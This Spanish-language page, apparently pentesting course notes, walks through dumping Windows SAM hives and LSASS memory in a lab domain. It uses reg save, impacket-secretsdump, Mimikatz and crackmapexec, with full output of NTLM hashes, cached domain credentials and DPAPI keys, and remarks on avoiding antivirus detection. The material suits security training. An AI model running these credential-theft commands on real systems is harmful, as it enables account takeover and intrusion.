---
icon: inbox-in
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Volcado de Isass y SAM en Linux

La herramienta `Mimikatz` es detectado por casi todos los sistemas `Windows` aunque mas adelante veremos herramientas de evasion para esto, pero si lo queremos hacer de otra forma con una herramienta de `linux` podremos hacerlo de la siguiente forma:

Primero tendremos que extraer desde `Windows` la rama donde se encuentra la `SAM` creando un archivo, el cual luego nos pasaremos al `kali`.

```powershell
cd .\Desktop
reg save hklm\sam sam.save
```

Info:

```
La operación se completó correctamente.
```

Esto nos dara un archivo llamado `sam.save` el cual nos tendremos que pasar al `kali`.

Pero a parte tambien volcaremos el `system`:

```powershell
reg save hklm\system system.save
```

Ahora nos copiaremos los 2 ficheros y los pasamos a nuestro `kali`.

Dentro de `kali` vamos a volcar la `SAM` desde el fichero que generamos `sam.save` de la siguiente forma:

```shell
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xc8125866b327df176940c9f2d6a48f5f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5ed544e71abe56b376b7993b21946520:::
santiago:1001:aad3b435b51404eeaad3b435b51404ee:7ce21f17c0aee7fb9ceba532d0546ad6:::
[*] Cleaning up...
```

Y vemos que nos ha volcado todos los `hashes` de la `SAM` como vimos anteriormente en `Windows` de la misma forma y sin que salte el Antivirus.

### Volcado de Isass

Ahora si queremos volcar la informacion de la `isass` pero para verlo en `linux` lo que podremos hacer es utilizar una herramienta que nos proporciona `Microsoft` para volcar esa informacion en un fichero como hemos estado haciendo anteriormente con el `SAM`.

URL = [Download ProcDump](https://learn.microsoft.com/es-es/sysinternals/downloads/procdump)

Antes de realizar todo esto, lo que vamos hacer es `Crear un archivo de volcado` de `lsass`, si nos vamos al `Administrador de tareas` -> `Detalles` -> buscamos el proceso `lsass.exe` -> click derecho y pinchar en `Crear archivo de volcado`.

<figure><img src="../../../.gitbook/assets/image (170).png" alt=""><figcaption></figcaption></figure>

Despues nos aparecera esto:

<figure><img src="../../../.gitbook/assets/image (171).png" alt=""><figcaption></figcaption></figure>

Y le daremos `Abrir ubicación del archivo`, por lo que veremos lo siguiente:

<figure><img src="../../../.gitbook/assets/image (172).png" alt=""><figcaption></figcaption></figure>

Y esto no salta `Windows Defender` ni ningun antivirus por alguna razon.

Ahora lo que vamos hacer es pasarnos este archivo a nuestra maquina `kali`.

Pero si nos volvemos a `Windows` lo podremos hacer en `Windows` con `Mimikatz`:

Estando en `Mimikatz`:

```powershell
sekurlsa::minidump C:\Users\empleado1\Desktop\lsass.DMP
```

Info:

```
Switch to MINIDUMP : 'C:\Users\empleado1\Desktop\lsass.DMP'
```

Ahora lo que haremos sera volcar el `lsass` del archivo este que le hemos especificado antes:

```powershell
sekurlsa::logonPasswords
```

Info:

```
Opening : 'C:\Users\empleado1\Desktop\lsass.DMP' file for minidump...

Authentication Id : 0 ; 3253663 (00000000:0031a59f)
Session           : Interactive from 0
User Name         : Administrator
Domain            : CORP
Logon Server      : DC01
Logon Time        : 19/01/2025 9:52:13
SID               : S-1-5-21-3352250647-938130414-2449934813-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : CORP
         * NTLM     : a87f3a337d73085c45f9416be5787d86
         * SHA1     : 34957e9ba3455a4a99d722b48693ac1123ba5dba
         * DPAPI    : b937fc9669fa922df0050d0d2f6d5de4
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : CORP.LOCAL
         * Password : (null)
        ssp :
        credman :
        cloudap :

Authentication Id : 0 ; 2351163 (00000000:0023e03b)
Session           : Interactive from 2
User Name         : empleado1
Domain            : CORP
Logon Server      : DC01
Logon Time        : 19/01/2025 9:39:14
SID               : S-1-5-21-3352250647-938130414-2449934813-1104
        msv :
         [00000003] Primary
         * Username : empleado1
         * Domain   : CORP
         * NTLM     : 1791df33b45987df23e4fe6c57ea6de7
         * SHA1     : 6ef021db9a1924563f77a5d9ebf3e3629de98851
         * DPAPI    : a5798e4a9a06f32761063a2a093f0074
        tspkg :
        wdigest :
         * Username : empleado1
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : empleado1
         * Domain   : CORP.LOCAL
         * Password : (null)
        ssp :
        credman :
        cloudap :
.......................<RESTO_DEL_CODIGO>.......................................
```

Y vemos que nos esta volcando la informacion, pero del fichero con `mimikatz`.

Ahora de forma remota lo que vamos hacer es `volcar` la informacion del `lsass.DMP` desde el `kali` hasta el `Windows`, es importante saber que tenemos que tener un usuario de dominio con privilegios de `administrador` locales para poder realizar esto.

Pero cuando hagamos esta tecnica, nos va a pedir la verificacion del `UAC` por lo que tendremos que realizar un `UAC Bypass` para que podamos obtener la informacion.

```shell
impacket-secretsdump empleado1:Passw0rd2@192.168.5.208
```

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xc8125866b327df176940c9f2d6a48f5f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5ed544e71abe56b376b7993b21946520:::
santiago:1001:aad3b435b51404eeaad3b435b51404ee:7ce21f17c0aee7fb9ceba532d0546ad6:::
[*] Dumping cached domain logon information (domain/username:hash)
CORP.LOCAL/empleado1:$DCC2$10240#empleado1#fda53d6158406f827388476bcbc97c37: (2025-01-19 08:39:14)
CORP.LOCAL/Administrator:$DCC2$10240#Administrator#e1c8d7e26653ae629a74772a389cf7e6: (2025-01-19 08:52:13)
CORP.LOCAL/annice.mable:$DCC2$10240#annice.mable#77702054bffe13f7c5bbe919a228d985: (2025-01-12 11:36:13)
CORP.LOCAL/angelika.shelly:$DCC2$10240#angelika.shelly#835512d4e4bb1d962c57d290eb99f670: (2025-01-12 16:51:40)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
CORP\WS01$:aes256-cts-hmac-sha1-96:9a9fc7447f8fa5521eeef5af175be7af2189392bc0d56f2e7d41e4c15cdad294
CORP\WS01$:aes128-cts-hmac-sha1-96:73670fc7a88720c24ff4c869dc84a9c1
CORP\WS01$:des-cbc-md5:8c5bea107cc8c804
CORP\WS01$:plain_password_hex:5700320055006b0049004e0027003d005e0055005c00750052004c0077006e004e00510045003c002d0066005d004b005f007600330072004400350022002700750068004e00300041003d0024006c004e0022005700750065006b00640034004a0056006f003e006c005f006c0050005c005d002700360077002c00290033005e005d004f005e005100560027002e003200380029004f0078005100410049002c003a0025005f00680072005d00380034002500490068002200640045006f0072005c0063002d0022005f002f006f0065006700720022005f0061006c00780047006400590062007700770059005f00
CORP\WS01$:aad3b435b51404eeaad3b435b51404ee:afc5c02d936d73808ce716070e883ab8:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x6be6aee6bc489e7fab1ed9a63b1aa5c0d2f13fef
dpapi_userkey:0xb83f8122ee552579d8fbf4d9b304ae19ab5bb7af
[*] NL$KM 
 0000   5C B5 3B 8C D5 28 A0 C3  6A F2 57 A3 08 B6 F7 D4   \.;..(..j.W.....
 0010   E4 7D 11 84 8F 2C 98 2B  2D DD 06 7D 30 53 B4 23   .}...,.+-..}0S.#
 0020   4B 8D C7 7E 92 96 5B 48  67 29 99 50 C1 E4 27 A6   K..~..[Hg).P..'.
 0030   37 2C 9D 99 E8 FD 57 11  CC 44 47 ED 30 6F 96 00   7,....W..DG.0o..
NL$KM:5cb53b8cd528a0c36af257a308b6f7d4e47d11848f2c982b2ddd067d3053b4234b8dc77e92965b4867299950c1e427a6372c9d99e8fd5711cc4447ed306f9600
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```

Tambien podremos utilizar `crackmapexec` que por debajo estaria utilizando el mismo modulo de `impacket` de la siguiente forma:

```shell
crackmapexec smb 192.168.5.208 -u empleado1 -p "Passw0rd2" --sam
```

Info:

```
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing RDP protocol database
[*] Initializing MSSQL protocol database
[*] Initializing SSH protocol database
[*] Initializing WINRM protocol database
[*] Initializing FTP protocol database
[*] Initializing LDAP protocol database
[*] Initializing SMB protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         192.168.5.208   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:corp.local) (signing:False) (SMBv1:False)
SMB         192.168.5.208   445    WS01             [+] corp.local\empleado1:Passw0rd2 (Pwn3d!)
SMB         192.168.5.208   445    WS01             [+] Dumping SAM hashes
SMB         192.168.5.208   445    WS01             Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.5.208   445    WS01             Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.5.208   445    WS01             DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.5.208   445    WS01             WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5ed544e71abe56b376b7993b21946520:::
SMB         192.168.5.208   445    WS01             santiago:1001:aad3b435b51404eeaad3b435b51404ee:7ce21f17c0aee7fb9ceba532d0546ad6:::
SMB         192.168.5.208   445    WS01             [+] Added 5 SAM hashes to the database
```

Podremos hacer lo de la misma forma pero con `lsass`:

```shell
crackmapexec smb 192.168.5.208 -u empleado1 -p "Passw0rd2" --lsa
```

Info:

```
SMB         192.168.5.208   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:corp.local) (signing:False) (SMBv1:False)
SMB         192.168.5.208   445    WS01             [+] corp.local\empleado1:Passw0rd2 (Pwn3d!)
SMB         192.168.5.208   445    WS01             [+] Dumping LSA secrets
SMB         192.168.5.208   445    WS01             CORP.LOCAL/empleado1:$DCC2$10240#empleado1#fda53d6158406f827388476bcbc97c37: (2025-01-19 08:39:14)
SMB         192.168.5.208   445    WS01             CORP.LOCAL/Administrator:$DCC2$10240#Administrator#e1c8d7e26653ae629a74772a389cf7e6: (2025-01-19 08:52:13)
SMB         192.168.5.208   445    WS01             CORP.LOCAL/annice.mable:$DCC2$10240#annice.mable#77702054bffe13f7c5bbe919a228d985: (2025-01-12 11:36:13)
SMB         192.168.5.208   445    WS01             CORP.LOCAL/angelika.shelly:$DCC2$10240#angelika.shelly#835512d4e4bb1d962c57d290eb99f670: (2025-01-12 16:51:40)
SMB         192.168.5.208   445    WS01             CORP\WS01$:aes256-cts-hmac-sha1-96:9a9fc7447f8fa5521eeef5af175be7af2189392bc0d56f2e7d41e4c15cdad294
SMB         192.168.5.208   445    WS01             CORP\WS01$:aes128-cts-hmac-sha1-96:73670fc7a88720c24ff4c869dc84a9c1
SMB         192.168.5.208   445    WS01             CORP\WS01$:des-cbc-md5:8c5bea107cc8c804
SMB         192.168.5.208   445    WS01             CORP\WS01$:plain_password_hex:5700320055006b0049004e0027003d005e0055005c00750052004c0077006e004e00510045003c002d0066005d004b005f007600330072004400350022002700750068004e00300041003d0024006c004e0022005700750065006b00640034004a0056006f003e006c005f006c0050005c005d002700360077002c00290033005e005d004f005e005100560027002e003200380029004f0078005100410049002c003a0025005f00680072005d00380034002500490068002200640045006f0072005c0063002d0022005f002f006f0065006700720022005f0061006c00780047006400590062007700770059005f00
SMB         192.168.5.208   445    WS01             CORP\WS01$:aad3b435b51404eeaad3b435b51404ee:afc5c02d936d73808ce716070e883ab8:::
SMB         192.168.5.208   445    WS01             dpapi_machinekey:0x6be6aee6bc489e7fab1ed9a63b1aa5c0d2f13fef
dpapi_userkey:0xb83f8122ee552579d8fbf4d9b304ae19ab5bb7af
SMB         192.168.5.208   445    WS01             NL$KM:5cb53b8cd528a0c36af257a308b6f7d4e47d11848f2c982b2ddd067d3053b4234b8dc77e92965b4867299950c1e427a6372c9d99e8fd5711cc4447ed306f9600
SMB         192.168.5.208   445    WS01             [+] Dumped 11 LSA secrets to /home/kali/.cme/logs/WS01_192.168.5.208_2025-01-19_051507.secrets and /home/kali/.cme/logs/WS01_192.168.5.208_2025-01-19_051507.cached
```

Si lo intentamos hacer con un usuario `local` con privilegios de `administrador` con este saltaria el `UAC` y nos nos dumpeara nada, pero con un usuario de dominio con privilegios de `administrador` local, por algun motivo no salta y si nos lo puede dumpear.
